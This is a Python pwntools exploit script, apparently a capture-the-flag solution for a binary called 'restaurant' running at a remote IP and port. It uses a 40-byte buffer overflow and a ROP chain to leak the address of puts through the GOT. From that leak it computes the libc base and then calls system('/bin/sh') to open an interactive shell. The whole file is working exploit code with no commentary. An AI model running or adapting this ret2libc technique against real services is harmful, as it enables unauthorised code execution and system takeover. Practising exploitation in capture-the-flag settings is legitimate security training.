#!/usr/bin/python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p = process("./restaurant")
p = remote("167.71.131.210", 32271)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)
rdi = 0x00000000004010A3
ret = 0x000000000040063E
main = 0x400F68
fill = 0x400E4A
offset = 40

elf = ELF("./restaurant")
libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
sla("> ", b"1")

rop = ROP(elf)
rop.call(elf.plt["puts"], [next(elf.search(b""))])
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call((rop.find_gadget(["ret"]))[0])
rop.call(elf.symbols["fill"])
sla("> ", flat({offset: rop.chain()}))
log.info(rop.dump())
p.recvuntil("\n")
p.recvuntil("\n")
leak = u64(p.recvuntil("\n").strip().ljust(8, b"\x00"))
log.info("leak: " + str(hex(leak)))
libc.address = leak - libc.symbols["puts"]
log.info("libc: " + str(hex(libc.address)))

l = ROP(libc)
l.call(l.find_gadget(["ret"])[0])
l.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
sla("> ", flat({offset: l.chain()}))

p.interactive()
